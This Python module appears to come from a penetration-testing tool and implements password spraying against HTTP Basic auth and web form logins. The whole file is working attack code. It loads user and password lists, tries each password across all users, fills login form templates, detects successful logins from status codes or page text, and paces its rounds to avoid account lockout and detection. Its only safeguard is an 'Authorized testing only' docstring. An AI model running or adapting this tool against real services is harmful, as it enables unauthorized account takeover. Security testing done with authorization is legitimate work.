"""Password-spray mode: HTTP Basic auth or form login. Authorized testing only.

Spray order is password-outer / user-inner (classic low-and-slow), with a pause
between password rounds to reduce account-lockout risk.
"""
import base64
import sys
import time
from urllib.parse import quote_plus


def load_list(spec):
    """'@file' -> lines of file; otherwise comma-separated inline values."""
    if spec.startswith("@"):
        with open(spec[1:], encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    return [s for s in spec.split(",") if s]


def _basic_ok(status):
    return status is not None and status not in (401, 403)


def _form_ok(status, body, fail, success):
    text = body.decode("utf-8", "ignore")
    if success:
        return success in text
    if fail:
        return status is not None and fail not in text
    # no oracle given -> can't judge form login reliably
    return False


def spray(fetcher, url, users, passwords, auth, data_tmpl, fail, success,
          round_delay, progress=True):
    """Return list of (user, password, status) that looked successful."""
    hits, tried, total = [], 0, len(users) * len(passwords)
    for pw in passwords:
        for u in users:
            tried += 1
            if auth == "basic":
                token = base64.b64encode(f"{u}:{pw}".encode()).decode()
                st, _, _, _ = fetcher.get(url, extra={"Authorization": "Basic " + token})
                ok = _basic_ok(st)
            else:  # form
                payload = (data_tmpl.replace("^USER^", quote_plus(u))
                                    .replace("^PASS^", quote_plus(pw))).encode()
                st, _, body, _ = fetcher.get(url, method="POST", data=payload)
                ok = _form_ok(st, body, fail, success)
            if progress:
                sys.stderr.write(f"\r[*] spray {tried}/{total}  {u}:{pw}      ")
                sys.stderr.flush()
            if ok:
                hits.append((u, pw, st))
        if round_delay and pw is not passwords[-1]:
            time.sleep(round_delay)
    if progress:
        sys.stderr.write("\r" + " " * 60 + "\r")
    return hits
